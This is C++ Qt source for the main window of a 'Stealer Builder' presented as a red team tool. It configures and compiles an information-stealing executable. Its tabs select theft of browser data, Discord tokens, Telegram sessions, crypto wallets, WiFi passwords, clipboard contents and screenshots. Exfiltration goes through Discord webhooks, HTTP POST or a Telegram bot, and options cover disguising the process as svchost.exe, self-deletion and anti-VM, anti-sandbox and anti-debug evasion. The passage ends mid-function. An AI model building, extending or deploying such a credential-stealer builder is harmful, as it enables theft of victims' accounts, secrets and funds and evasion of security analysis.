#include "mainwindow.h"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QFormLayout>
#include <QGridLayout>
#include <QFileDialog>
#include <QMessageBox>
#include <QScrollArea>
#include <QSplitter>
#include <QDir>
#include <QFont>
#include <QApplication>

MainWindow::MainWindow(QWidget* parent)
    : QMainWindow(parent) {
    
    m_compilerManager = new CompilerManager(this);
    m_stubGenerator = new StubGenerator();
    m_builder = new Builder(this);
    
    setupUI();
    
    // Connect signals
    connect(m_compilerManager, &CompilerManager::detectionComplete, this, &MainWindow::onCompilerDetected);
    connect(m_builder, &Builder::buildProgress, this, &MainWindow::onBuildProgress);
    connect(m_builder, &Builder::buildFinished, this, &MainWindow::onBuildFinished);
    connect(m_builder, &Builder::outputReceived, this, &MainWindow::onOutputReceived);
    
    // Detect compilers
    m_compilerStatusLabel->setText("Detecting compilers...");
    m_compilerManager->detectCompilers();
}

MainWindow::~MainWindow() {
    delete m_stubGenerator;
}

void MainWindow::setupUI() {
    setWindowTitle("Stealer Builder - Red Team Tool");
    resize(1100, 750);
    
    // Set application font explicitly
    // Liberation Sans is embedded and metrically compatible with Arial
    QFont appFont;
    appFont.setFamily("Liberation Sans");
    appFont.setPointSize(10);
    appFont.setStyleHint(QFont::SansSerif);
    appFont.setStyleStrategy(QFont::PreferAntialias);
    QApplication::setFont(appFont);
    
    // Set application-wide stylesheet
    setStyleSheet(R"(
        QMainWindow {
            background-color: #2b2b2b;
        }
        QWidget {
            background-color: #2b2b2b;
            color: #e0e0e0;
            font-family: 'Liberation Sans', Arial, 'Helvetica Neue', Helvetica, sans-serif;
            font-size: 10pt;
        }
        QTabWidget::pane {
            border: 1px solid #3d3d3d;
            background-color: #323232;
            border-radius: 4px;
        }
        QTabBar::tab {
            background-color: #3d3d3d;
            color: #b0b0b0;
            padding: 10px 20px;
            margin-right: 2px;
            border-top-left-radius: 4px;
            border-top-right-radius: 4px;
        }
        QTabBar::tab:selected {
            background-color: #4a4a4a;
            color: #ffffff;
            font-weight: bold;
        }
        QTabBar::tab:hover {
            background-color: #454545;
            color: #ffffff;
        }
        QGroupBox {
            border: 2px solid #4a4a4a;
            border-radius: 6px;
            margin-top: 12px;
            padding-top: 12px;
            font-weight: bold;
            color: #00bcd4;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 10px;
            padding: 0 5px;
        }
        QLineEdit {
            background-color: #3d3d3d;
            border: 1px solid #555555;
            border-radius: 4px;
            padding: 6px;
            color: #e0e0e0;
        }
        QLineEdit:focus {
            border: 1px solid #00bcd4;
        }
        QCheckBox {
            color: #d0d0d0;
            spacing: 8px;
        }
        QCheckBox::indicator {
            width: 18px;
            height: 18px;
            border: 2px solid #555555;
            border-radius: 3px;
            background-color: #3d3d3d;
        }
        QCheckBox::indicator:checked {
            background-color: #00bcd4;
            border-color: #00bcd4;
        }
        QCheckBox::indicator:hover {
            border-color: #00bcd4;
        }
        QComboBox {
            background-color: #3d3d3d;
            border: 1px solid #555555;
            border-radius: 4px;
            padding: 6px;
            color: #e0e0e0;
        }
        QComboBox:hover {
            border: 1px solid #00bcd4;
        }
        QComboBox::drop-down {
            border: none;
            width: 20px;
        }
        QComboBox QAbstractItemView {
            background-color: #3d3d3d;
            color: #e0e0e0;
            selection-background-color: #00bcd4;
            border: 1px solid #555555;
        }
        QPushButton {
            background-color: #4a4a4a;
            color: #e0e0e0;
            border: none;
            border-radius: 4px;
            padding: 10px 20px;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #555555;
        }
        QPushButton:pressed {
            background-color: #606060;
        }
        QLabel {
            color: #d0d0d0;
        }
        QTextEdit {
            background-color: #1e1e1e;
            color: #d4d4d4;
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 9pt;
        }
        QScrollBar:vertical {
            background-color: #2b2b2b;
            width: 12px;
            border-radius: 6px;
        }
        QScrollBar::handle:vertical {
            background-color: #555555;
            border-radius: 6px;
            min-height: 20px;
        }
        QScrollBar::handle:vertical:hover {
            background-color: #666666;
        }
        QScrollBar:horizontal {
            background-color: #2b2b2b;
            height: 12px;
            border-radius: 6px;
        }
        QScrollBar::handle:horizontal {
            background-color: #555555;
            border-radius: 6px;
            min-width: 20px;
        }
        QScrollBar::handle:horizontal:hover {
            background-color: #666666;
        }
        QSplitter::handle {
            background-color: #3d3d3d;
        }
    )");
    
    QWidget* centralWidget = new QWidget(this);
    setCentralWidget(centralWidget);
    
    QVBoxLayout* mainLayout = new QVBoxLayout(centralWidget);
    mainLayout->setContentsMargins(10, 10, 10, 10);
    mainLayout->setSpacing(10);
    
    // Title bar
    QLabel* titleLabel = new QLabel("STEALER BUILDER  —  Red Team Configuration Tool", this);
    QFont titleFont("Liberation Sans", 13, QFont::Bold);
    titleFont.setLetterSpacing(QFont::AbsoluteSpacing, 1.0);
    titleLabel->setFont(titleFont);
    titleLabel->setStyleSheet(R"(
        QLabel {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                       stop:0 #d32f2f, stop:0.5 #c62828, stop:1 #b71c1c);
            color: white;
            padding: 15px;
            border-radius: 6px;
        }
    )");
    titleLabel->setAlignment(Qt::AlignCenter);
    mainLayout->addWidget(titleLabel);
    
    // Create splitter for tabs and output
    QSplitter* splitter = new QSplitter(Qt::Vertical, this);
    
    // Tab widget
    m_tabWidget = new QTabWidget(this);
    createGrabberTab();
    createExfiltrationTab();
    createSystemInfoTab();
    createStealthTab();
    createAntiAnalysisTab();
    createBuildTab();
    createDependenciesTab();  // Last tab, auto-opens on build failure
    
    splitter->addWidget(m_tabWidget);
    
    // Build output area
    createBuildOutputArea();
    splitter->addWidget(m_buildOutputText);
    
    splitter->setStretchFactor(0, 3);
    splitter->setStretchFactor(1, 1);
    
    mainLayout->addWidget(splitter);
    
    // Bottom buttons with improved styling
    QHBoxLayout* buttonLayout = new QHBoxLayout();
    buttonLayout->setSpacing(10);
    
    QPushButton* saveConfigBtn = new QPushButton("Save Config", this);
    saveConfigBtn->setStyleSheet(R"(
        QPushButton {
            background-color: #455a64;
            color: white;
            font-weight: bold;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 10pt;
        }
        QPushButton:hover {
            background-color: #546e7a;
        }
        QPushButton:pressed {
            background-color: #37474f;
        }
    )");
    saveConfigBtn->setCursor(Qt::PointingHandCursor);
    
    QPushButton* loadConfigBtn = new QPushButton("Load Config", this);
    loadConfigBtn->setStyleSheet(R"(
        QPushButton {
            background-color: #455a64;
            color: white;
            font-weight: bold;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 10pt;
        }
        QPushButton:hover {
            background-color: #546e7a;
        }
        QPushButton:pressed {
            background-color: #37474f;
        }
    )");
    loadConfigBtn->setCursor(Qt::PointingHandCursor);
    
    m_buildButton = new QPushButton("▶  BUILD EXECUTABLE", this);
    QFont buildFont("Liberation Sans", 11, QFont::Bold);
    buildFont.setLetterSpacing(QFont::AbsoluteSpacing, 1.0);
    m_buildButton->setFont(buildFont);
    m_buildButton->setStyleSheet(R"(
        QPushButton {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                       stop:0 #2e7d32, stop:0.5 #388e3c, stop:1 #43a047);
            color: white;
            padding: 12px 40px;
            border-radius: 6px;
        }
        QPushButton:hover {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                       stop:0 #388e3c, stop:0.5 #43a047, stop:1 #4caf50);
        }
        QPushButton:pressed {
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                       stop:0 #1b5e20, stop:0.5 #2e7d32, stop:1 #388e3c);
        }
        QPushButton:disabled {
            background-color: #616161;
            color: #9e9e9e;
        }
    )");
    m_buildButton->setCursor(Qt::PointingHandCursor);
    
    connect(saveConfigBtn, &QPushButton::clicked, this, &MainWindow::onSaveConfigClicked);
    connect(loadConfigBtn, &QPushButton::clicked, this, &MainWindow::onLoadConfigClicked);
    connect(m_buildButton, &QPushButton::clicked, this, &MainWindow::onBuildClicked);
    
    buttonLayout->addWidget(saveConfigBtn);
    buttonLayout->addWidget(loadConfigBtn);
    buttonLayout->addStretch();
    buttonLayout->addWidget(m_buildButton);
    
    mainLayout->addLayout(buttonLayout);
}

void MainWindow::createDependenciesTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* layout = new QVBoxLayout(tab);
    layout->setContentsMargins(20, 20, 20, 20);
    layout->setSpacing(20);
    
    // Header
    QLabel* headerLabel = new QLabel("⚠️  DEPENDENCIES REQUIRED", this);
    headerLabel->setStyleSheet(R"(
        QLabel {
            font-size: 14pt;
            font-weight: bold;
            color: #ff9800;
            padding: 10px;
            background-color: #3d3d3d;
            border-radius: 6px;
            border-left: 4px solid #ff9800;
        }
    )");
    layout->addWidget(headerLabel);
    
    // Windows Dependencies
#ifdef Q_OS_WIN
    QGroupBox* windowsGroup = new QGroupBox("🪟 Windows Dependencies", this);
    windowsGroup->setStyleSheet("QGroupBox { color: #ff9800; }");
    QVBoxLayout* windowsLayout = new QVBoxLayout(windowsGroup);
    windowsLayout->setContentsMargins(15, 20, 15, 15);
    windowsLayout->setSpacing(15);
    
    QLabel* compilerLabel = new QLabel("<b>Windows C++ Compiler (Choose ONE):</b>", this);
    compilerLabel->setStyleSheet("QLabel { color: #00bcd4; font-size: 11pt; }");
    windowsLayout->addWidget(compilerLabel);
    
    QLabel* msvcLabel = new QLabel(
        "• <b>Visual Studio 2019+ with C++ Build Tools</b><br>"
        "  Download: <a href='https://visualstudio.microsoft.com/downloads/' style='color: #4fc3f7;'>https://visualstudio.microsoft.com/downloads/</a><br>"
        "  - Install \"Desktop development with C++\" workload<br>"
        "  - The build.bat script can auto-install this", this);
    msvcLabel->setWordWrap(true);
    msvcLabel->setOpenExternalLinks(true);
    msvcLabel->setTextFormat(Qt::RichText);
    msvcLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    windowsLayout->addWidget(msvcLabel);
    
    QLabel* mingwLabel = new QLabel(
        "• <b>MinGW-w64</b><br>"
        "  Download: <a href='https://www.mingw-w64.org/downloads/' style='color: #4fc3f7;'>https://www.mingw-w64.org/downloads/</a><br>"
        "  - Add to PATH after installation", this);
    mingwLabel->setWordWrap(true);
    mingwLabel->setOpenExternalLinks(true);
    mingwLabel->setTextFormat(Qt::RichText);
    mingwLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    windowsLayout->addWidget(mingwLabel);
    
    QLabel* qtLabel = new QLabel(
        "<b>Qt6:</b><br>"
        "• <b>Qt 6.7.2</b> with MSVC 2019 64-bit component<br>"
        "  Download: <a href='https://www.qt.io/download-qt-installer' style='color: #4fc3f7;'>https://www.qt.io/download-qt-installer</a><br>"
        "  - The build.bat script can auto-install this via aqtinstall", this);
    qtLabel->setWordWrap(true);
    qtLabel->setOpenExternalLinks(true);
    qtLabel->setTextFormat(Qt::RichText);
    qtLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; color: #9c27b0; }");
    windowsLayout->addWidget(qtLabel);
    
    QLabel* cmakeLabel = new QLabel(
        "<b>CMake:</b><br>"
        "• Download: <a href='https://cmake.org/download/' style='color: #4fc3f7;'>https://cmake.org/download/</a><br>"
        "  - Add to PATH during installation<br>"
        "  - The build.bat script can check and auto-install this", this);
    cmakeLabel->setWordWrap(true);
    cmakeLabel->setOpenExternalLinks(true);
    cmakeLabel->setTextFormat(Qt::RichText);
    cmakeLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; color: #4caf50; }");
    windowsLayout->addWidget(cmakeLabel);
    
    layout->addWidget(windowsGroup);
#else
    // Linux Dependencies
    QGroupBox* linuxGroup = new QGroupBox("🐧 Linux Dependencies", this);
    linuxGroup->setStyleSheet("QGroupBox { color: #ff9800; }");
    QVBoxLayout* linuxLayout = new QVBoxLayout(linuxGroup);
    linuxLayout->setContentsMargins(15, 20, 15, 15);
    linuxLayout->setSpacing(15);
    
    QLabel* compilerLabel = new QLabel("<b>MinGW-w64 Cross-Compiler:</b>", this);
    compilerLabel->setStyleSheet("QLabel { color: #00bcd4; font-size: 11pt; }");
    linuxLayout->addWidget(compilerLabel);
    
    QLabel* debianLabel = new QLabel(
        "• <b>Debian/Ubuntu:</b><br>"
        "  <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo apt-get install mingw-w64</span>", this);
    debianLabel->setWordWrap(true);
    debianLabel->setTextFormat(Qt::RichText);
    debianLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    linuxLayout->addWidget(debianLabel);
    
    QLabel* fedoraLabel = new QLabel(
        "• <b>Fedora/RHEL:</b><br>"
        "  <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo dnf install mingw64-gcc mingw64-gcc-c++</span>", this);
    fedoraLabel->setWordWrap(true);
    fedoraLabel->setTextFormat(Qt::RichText);
    fedoraLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    linuxLayout->addWidget(fedoraLabel);
    
    QLabel* archLabel = new QLabel(
        "• <b>Arch Linux:</b><br>"
        "  <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo pacman -S mingw-w64-gcc</span>", this);
    archLabel->setWordWrap(true);
    archLabel->setTextFormat(Qt::RichText);
    archLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    linuxLayout->addWidget(archLabel);
    
    QLabel* qtLinuxLabel = new QLabel(
        "<b>Qt6 Development Libraries:</b><br>"
        "• <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo apt-get install qt6-base-dev</span> (Debian/Ubuntu)<br>"
        "• <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo dnf install qt6-qtbase-devel</span> (Fedora)<br>"
        "• <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo pacman -S qt6-base</span> (Arch)", this);
    qtLinuxLabel->setWordWrap(true);
    qtLinuxLabel->setTextFormat(Qt::RichText);
    qtLinuxLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; color: #9c27b0; }");
    linuxLayout->addWidget(qtLinuxLabel);
    
    QLabel* cmakeLinuxLabel = new QLabel(
        "<b>CMake:</b><br>"
        "• Usually available in default repos: <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 5px;'>sudo apt-get install cmake</span>", this);
    cmakeLinuxLabel->setWordWrap(true);
    cmakeLinuxLabel->setTextFormat(Qt::RichText);
    cmakeLinuxLabel->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; color: #4caf50; }");
    linuxLayout->addWidget(cmakeLinuxLabel);
    
    layout->addWidget(linuxGroup);
#endif
    
    // Build Instructions
    QGroupBox* buildGroup = new QGroupBox("🛠️ Building the Application", this);
    buildGroup->setStyleSheet("QGroupBox { color: #4caf50; }");
    QVBoxLayout* buildLayout = new QVBoxLayout(buildGroup);
    buildLayout->setContentsMargins(15, 20, 15, 15);
    buildLayout->setSpacing(10);
    
#ifdef Q_OS_WIN
    QLabel* buildInstructions = new QLabel(
        "1. Install dependencies listed above<br>"
        "2. Run <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 3px;'>build.bat</span> from the project root<br>"
        "3. The script will auto-detect and auto-install missing dependencies<br>"
        "4. If auto-install fails, follow the manual instructions provided<br>"
        "5. The built executable will be copied to the project root", this);
#else
    QLabel* buildInstructions = new QLabel(
        "1. Install dependencies listed above<br>"
        "2. Run <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 3px;'>./build.sh</span> from the project root<br>"
        "3. The built executable will be in <span style='font-family: \"Liberation Mono\", monospace;'>build/bin/StealerBuilder</span>", this);
#endif
    buildInstructions->setWordWrap(true);
    buildInstructions->setTextFormat(Qt::RichText);
    buildInstructions->setStyleSheet("QLabel { padding: 10px; background-color: #2d2d2d; border-radius: 4px; }");
    buildLayout->addWidget(buildInstructions);
    
    layout->addWidget(buildGroup);
    
    // Warning
    QLabel* warningLabel = new QLabel(
        "⚠️ <b>IMPORTANT:</b> Without a proper Windows C++ compiler installed, "
        "you will not be able to build the stub executable. The application will show "
        "an error when you try to build.", this);
    warningLabel->setWordWrap(true);
    warningLabel->setTextFormat(Qt::RichText);
    warningLabel->setStyleSheet(R"(
        QLabel {
            color: #ff5252;
            padding: 15px;
            background-color: #3d1f1f;
            border-radius: 6px;
            border-left: 4px solid #ff5252;
        }
    )");
    layout->addWidget(warningLabel);
    
#ifdef Q_OS_WIN
    // Tip for Windows users
    QLabel* tipLabel = new QLabel(
        "💡 <b>TIP:</b> If you have Visual Studio installed but the compiler is not detected:<br>"
        "1. Open \"x64 Native Tools Command Prompt for VS 2022\" from the Start Menu<br>"
        "2. Navigate to the project directory<br>"
        "3. Run <span style='font-family: \"Liberation Mono\", monospace; background-color: #1e1e1e; padding: 3px;'>StealerBuilder.exe</span><br>"
        "The compiler will be detected automatically in the VS Developer Command Prompt.", this);
    tipLabel->setWordWrap(true);
    tipLabel->setTextFormat(Qt::RichText);
    tipLabel->setStyleSheet(R"(
        QLabel {
            color: #4caf50;
            padding: 15px;
            background-color: #1f3d2c;
            border-radius: 6px;
            border-left: 4px solid #4caf50;
        }
    )");
    layout->addWidget(tipLabel);
#endif
    
    layout->addStretch();
    
    m_tabWidget->addTab(tab, "ℹ️  Dependencies");
}

void MainWindow::createGrabberTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* layout = new QVBoxLayout(tab);
    layout->setSpacing(15);
    
    QGroupBox* browserGroup = new QGroupBox("🌐 Browser Data", this);
    browserGroup->setStyleSheet("QGroupBox { color: #ff9800; }");
    QVBoxLayout* browserLayout = new QVBoxLayout(browserGroup);
    browserLayout->setContentsMargins(15, 20, 15, 15);
    browserLayout->setSpacing(10);
    
    m_grabChromeCheck = new QCheckBox("🔴 Google Chrome", this);
    m_grabFirefoxCheck = new QCheckBox("🦊 Mozilla Firefox", this);
    m_grabEdgeCheck = new QCheckBox("🔷 Microsoft Edge", this);
    m_grabBraveCheck = new QCheckBox("🦁 Brave Browser", this);
    
    browserLayout->addWidget(m_grabChromeCheck);
    browserLayout->addWidget(m_grabFirefoxCheck);
    browserLayout->addWidget(m_grabEdgeCheck);
    browserLayout->addWidget(m_grabBraveCheck);
    
    layout->addWidget(browserGroup);
    
    QGroupBox* appsGroup = new QGroupBox("💬 Applications", this);
    appsGroup->setStyleSheet("QGroupBox { color: #9c27b0; }");
    QVBoxLayout* appsLayout = new QVBoxLayout(appsGroup);
    appsLayout->setContentsMargins(15, 20, 15, 15);
    appsLayout->setSpacing(10);
    
    m_grabDiscordCheck = new QCheckBox("💬 Discord Tokens", this);
    m_grabTelegramCheck = new QCheckBox("✈️  Telegram Sessions", this);
    
    appsLayout->addWidget(m_grabDiscordCheck);
    appsLayout->addWidget(m_grabTelegramCheck);
    
    layout->addWidget(appsGroup);
    
    QGroupBox* otherGroup = new QGroupBox("💰 Other Data", this);
    otherGroup->setStyleSheet("QGroupBox { color: #4caf50; }");
    QVBoxLayout* otherLayout = new QVBoxLayout(otherGroup);
    otherLayout->setContentsMargins(15, 20, 15, 15);
    otherLayout->setSpacing(10);
    
    m_grabWalletsCheck = new QCheckBox("💰 Cryptocurrency Wallets", this);
    m_grabWifiCheck = new QCheckBox("📶 WiFi Passwords", this);
    m_grabClipboardCheck = new QCheckBox("📋 Clipboard", this);
    m_captureScreenCheck = new QCheckBox("📸 Capture Screenshot", this);
    
    otherLayout->addWidget(m_grabWalletsCheck);
    otherLayout->addWidget(m_grabWifiCheck);
    otherLayout->addWidget(m_grabClipboardCheck);
    otherLayout->addWidget(m_captureScreenCheck);
    
    layout->addWidget(otherGroup);
    
    QLabel* infoLabel = new QLabel("ℹ️  Grabbed data will be organized into folders and exfiltrated via the configured method.", this);
    infoLabel->setWordWrap(true);
    infoLabel->setStyleSheet("QLabel { color: #90caf9; font-style: italic; padding: 10px; background-color: #1e3a5f; border-radius: 4px; }");
    layout->addWidget(infoLabel);
    
    layout->addStretch();
    
    m_tabWidget->addTab(tab, "Grabber");
}

void MainWindow::createExfiltrationTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);
    
    QGroupBox* webhookGroup = new QGroupBox("🪝 Webhook Exfiltration", this);
    webhookGroup->setStyleSheet("QGroupBox { color: #7289da; }");
    QFormLayout* webhookLayout = new QFormLayout(webhookGroup);
    webhookLayout->setContentsMargins(15, 20, 15, 15);
    webhookLayout->setSpacing(10);
    
    m_webhookUrlEdit = new QLineEdit(this);
    m_webhookUrlEdit->setPlaceholderText("https://discord.com/api/webhooks/...");
    m_webhookUrlEdit->setMinimumHeight(30);
    webhookLayout->addRow("💬 Discord/Slack Webhook:", m_webhookUrlEdit);
    
    mainLayout->addWidget(webhookGroup);
    
    QGroupBox* httpGroup = new QGroupBox("🌐 HTTP POST Exfiltration", this);
    httpGroup->setStyleSheet("QGroupBox { color: #4caf50; }");
    QFormLayout* httpLayout = new QFormLayout(httpGroup);
    httpLayout->setContentsMargins(15, 20, 15, 15);
    httpLayout->setSpacing(10);
    
    m_httpPostUrlEdit = new QLineEdit(this);
    m_httpPostUrlEdit->setPlaceholderText("https://yourserver.com/receive");
    m_httpPostUrlEdit->setMinimumHeight(30);
    httpLayout->addRow("📡 HTTP POST Endpoint:", m_httpPostUrlEdit);
    
    mainLayout->addWidget(httpGroup);
    
    QGroupBox* telegramGroup = new QGroupBox("✈️  Telegram Bot Exfiltration", this);
    telegramGroup->setStyleSheet("QGroupBox { color: #0088cc; }");
    QFormLayout* telegramLayout = new QFormLayout(telegramGroup);
    telegramLayout->setContentsMargins(15, 20, 15, 15);
    telegramLayout->setSpacing(10);
    
    m_telegramTokenEdit = new QLineEdit(this);
    m_telegramTokenEdit->setPlaceholderText("123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11");
    m_telegramTokenEdit->setMinimumHeight(30);
    telegramLayout->addRow("🔑 Bot Token:", m_telegramTokenEdit);
    
    m_telegramChatIdEdit = new QLineEdit(this);
    m_telegramChatIdEdit->setPlaceholderText("123456789");
    m_telegramChatIdEdit->setMinimumHeight(30);
    telegramLayout->addRow("💬 Chat ID:", m_telegramChatIdEdit);
    
    mainLayout->addWidget(telegramGroup);
    
    QLabel* infoLabel = new QLabel("ℹ️  Data will be exfiltrated to the first configured endpoint. "
                                    "Configure at least one method if grabbing data. Data will be sent as JSON or multipart form.", this);
    infoLabel->setWordWrap(true);
    infoLabel->setStyleSheet("QLabel { color: #90caf9; font-style: italic; padding: 10px; background-color: #1e3a5f; border-radius: 4px; }");
    mainLayout->addWidget(infoLabel);
    
    mainLayout->addStretch();
    
    m_tabWidget->addTab(tab, "Exfiltration");
}

void MainWindow::createSystemInfoTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* layout = new QVBoxLayout(tab);
    layout->setSpacing(15);
    
    QGroupBox* group = new QGroupBox("🖥️  System Information to Collect", this);
    group->setStyleSheet("QGroupBox { color: #2196f3; }");
    QVBoxLayout* groupLayout = new QVBoxLayout(group);
    groupLayout->setContentsMargins(15, 20, 15, 15);
    groupLayout->setSpacing(12);
    
    m_collectHWIDCheck = new QCheckBox("🔑 Hardware ID (HWID) - Unique Machine Identifier", this);
    m_collectIPCheck = new QCheckBox("🌐 IP Address (Local & Public)", this);
    m_collectOSInfoCheck = new QCheckBox("💻 OS Version & Build Number", this);
    m_collectInstalledAVCheck = new QCheckBox("🛡️  Installed Antivirus & Security Software", this);
    m_collectProcessListCheck = new QCheckBox("⚙️  Running Processes", this);
    m_collectSpecsCheck = new QCheckBox("📊 PC Specifications (CPU, RAM, GPU, Disk)", this);
    
    groupLayout->addWidget(m_collectHWIDCheck);
    groupLayout->addWidget(m_collectIPCheck);
    groupLayout->addWidget(m_collectOSInfoCheck);
    groupLayout->addWidget(m_collectInstalledAVCheck);
    groupLayout->addWidget(m_collectProcessListCheck);
    groupLayout->addWidget(m_collectSpecsCheck);
    
    layout->addWidget(group);
    
    QLabel* infoLabel = new QLabel("ℹ️  System information helps identify the target machine and its security posture.", this);
    infoLabel->setWordWrap(true);
    infoLabel->setStyleSheet("QLabel { color: #90caf9; font-style: italic; padding: 10px; background-color: #1e3a5f; border-radius: 4px; }");
    layout->addWidget(infoLabel);
    
    layout->addStretch();
    
    m_tabWidget->addTab(tab, "System Info");
}

void MainWindow::createStealthTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);
    
    QGroupBox* stealthGroup = new QGroupBox("🥷 Stealth & Evasion Options", this);
    stealthGroup->setStyleSheet("QGroupBox { color: #673ab7; }");
    QFormLayout* layout = new QFormLayout(stealthGroup);
    layout->setContentsMargins(15, 20, 15, 15);
    layout->setSpacing(12);
    
    m_processNameEdit = new QLineEdit(this);
    m_processNameEdit->setText("svchost.exe");
    m_processNameEdit->setPlaceholderText("svchost.exe");
    m_processNameEdit->setMinimumHeight(30);
    layout->addRow("🔄 Process Name:", m_processNameEdit);
    
    m_mutexNameEdit = new QLineEdit(this);
    m_mutexNameEdit->setPlaceholderText("Global\\MyUniqueMutex");
    m_mutexNameEdit->setMinimumHeight(30);
    layout->addRow("🔒 Mutex (Single Instance):", m_mutexNameEdit);
    
    layout->addRow(new QLabel(""));
    
    m_selfDestructCheck = new QCheckBox("💣 Self-destruct after execution", this);
    layout->addRow("", m_selfDestructCheck);
    
    m_meltFileCheck = new QCheckBox("🔥 Melt file (delete executable after run)", this);
    layout->addRow("", m_meltFileCheck);
    
    mainLayout->addWidget(stealthGroup);
    
    QLabel* infoLabel = new QLabel("ℹ️  Stealth features help avoid detection and prevent multiple instances. "
                                    "Self-destruct removes the file after execution.", this);
    infoLabel->setWordWrap(true);
    infoLabel->setStyleSheet("QLabel { color: #90caf9; font-style: italic; padding: 10px; background-color: #1e3a5f; border-radius: 4px; }");
    mainLayout->addWidget(infoLabel);
    
    mainLayout->addStretch();
    
    m_tabWidget->addTab(tab, "Stealth");
}

void MainWindow::createAntiAnalysisTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* layout = new QVBoxLayout(tab);
    layout->setSpacing(15);
    
    QGroupBox* group = new QGroupBox("🔬 Anti-Analysis Techniques", this);
    group->setStyleSheet("QGroupBox { color: #f44336; }");
    QVBoxLayout* groupLayout = new QVBoxLayout(group);
    groupLayout->setContentsMargins(15, 20, 15, 15);
    groupLayout->setSpacing(12);
    
    m_antiVMCheck = new QCheckBox("🖥️  Anti-VM Detection (VirtualBox, VMware, QEMU, Hyper-V)", this);
    m_antiSandboxCheck = new QCheckBox("📦 Anti-Sandbox (Cuckoo, Any.run, Joe Sandbox)", this);
    m_antiDebugCheck = new QCheckBox("🐛 Anti-Debug (IsDebuggerPresent, Remote Debugger)", this);
    m_sleepEvasionCheck = new QCheckBox("⏱️  Sleep Evasion (Timing Checks with GetTickCount)", this);
    
    groupLayout->addWidget(m_antiVMCheck);
    groupLayout->addWidget(m_antiSandboxCheck);
    groupLayout->addWidget(m_antiDebugCheck);
    groupLayout->addWidget(m_sleepEvasionCheck);
    
    layout->addWidget(group);
    
    QLabel* warningLabel = new QLabel("⚠️  WARNING: These techniques detect analysis environments and terminate execution if detected. "
                                      "The stub will exit immediately if running in a VM, sandbox, or debugger.", this);
    warningLabel->setWordWrap(true);
    warningLabel->setStyleSheet("QLabel { color: #ffccbc; font-weight: bold; padding: 10px; background-color: #bf360c; border-radius: 4px; }");
    layout->addWidget(warningLabel);
    
    layout->addStretch();
    
    m_tabWidget->addTab(tab, "Anti-Analysis");
}

void MainWindow::createBuildTab() {
    QWidget* tab = new QWidget();
    QVBoxLayout* mainLayout = new QVBoxLayout(tab);
    mainLayout->setSpacing(15);
    
    QGroupBox* outputGroup = new QGroupBox("📦 Output Configuration", this);
    outputGroup->setStyleSheet("QGroupBox { color: #00bcd4; }");
    QFormLayout* outputLayout = new QFormLayout(outputGroup);
    outputLayout->setContentsMargins(15, 20, 15, 15);
    outputLayout->setSpacing(10);
    
    m_outputNameEdit = new QLineEdit(this);
    m_outputNameEdit->setText("output.exe");
    m_outputNameEdit->setPlaceholderText("output.exe");
    m_outputNameEdit->setMinimumHeight(30);
    outputLayout->addRow("📄 Output Filename:", m_outputNameEdit);
    
    m_iconPathEdit = new QLineEdit(this);
    m_iconPathEdit->setPlaceholderText("Leave empty for default");
    m_iconPathEdit->setMinimumHeight(30);
    QPushButton* browseIconBtn = new QPushButton("📁 Browse", this);
    browseIconBtn->setMinimumHeight(30);
    connect(browseIconBtn, &QPushButton::clicked, [this]() {
        QString file = QFileDialog::getOpenFileName(this, "Select Icon", "", "Icon Files (*.ico)");
        if (!file.isEmpty()) {
            m_iconPathEdit->setText(file);
        }
    });
    QHBoxLayout* iconLayout = new QHBoxLayout();
    iconLayout->addWidget(m_iconPathEdit);
    iconLayout->addWidget(browseIconBtn);
    outputLayout->addRow("🎨 Icon File:", iconLayout);
    
    m_architectureCombo = new QComboBox(this);
    m_architectureCombo->addItems({"x64", "x86"});
    m_architectureCombo->setMinimumHeight(30);
    outputLayout->addRow("🏗️  Architecture:", m_architectureCombo);
    
    mainLayout->addWidget(outputGroup);
    
    QGroupBox* compileGroup = new QGroupBox("⚙️  Compilation Options", this);
    compileGroup->setStyleSheet("QGroupBox { color: #8bc34a; }");
